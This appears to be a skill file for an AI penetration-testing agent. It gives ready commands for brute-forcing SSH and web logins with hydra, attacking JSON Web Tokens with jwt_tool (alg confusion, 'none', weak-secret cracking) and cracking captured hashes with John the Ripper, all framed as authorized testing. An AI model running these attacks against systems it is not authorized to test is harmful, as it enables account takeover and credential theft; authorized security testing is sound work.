---
name: test-authentication
description: Test a target's authentication — brute-force logins, attack JSON Web Tokens, and crack captured hashes. Use whenever the task is credential testing, brute-forcing a login (http/ssh/ftp), JWT attacks (alg confusion, none, weak secret), or cracking password hashes offline. For authorized testing only, against the baked wordlists.
agents: exploiter
---

# Test logins, tokens, and hashes

Authorized targets only. Baked lists live at `/opt/ghost/wordlists`.

- Online login brute-forcing:
  `hydra -L /opt/ghost/wordlists/top-usernames-shortlist.txt -P /opt/ghost/wordlists/top-10000-passwords.txt ssh://example.com`.
  For a web form, use the `http-post-form` module with its
  `"path:body:F=failure-string"` triple. Keep it targeted — a wide brute is loud
  and slow.
- JWT attacks: `jwt_tool <token> -T` to tamper claims, `-X a` for alg-confusion
  and `none`, `-C -d /opt/ghost/wordlists/top-10000-passwords.txt` to crack a weak
  HMAC secret.
- Crack hashes you obtained, offline:
  `john --wordlist=/opt/ghost/wordlists/top-10000-passwords.txt hashes.txt`
  (`--format=NAME` if John cannot detect the type, `--show` to print recovered).
- Record confirmed credentials or tokens, and how you got them, to `findings/`.
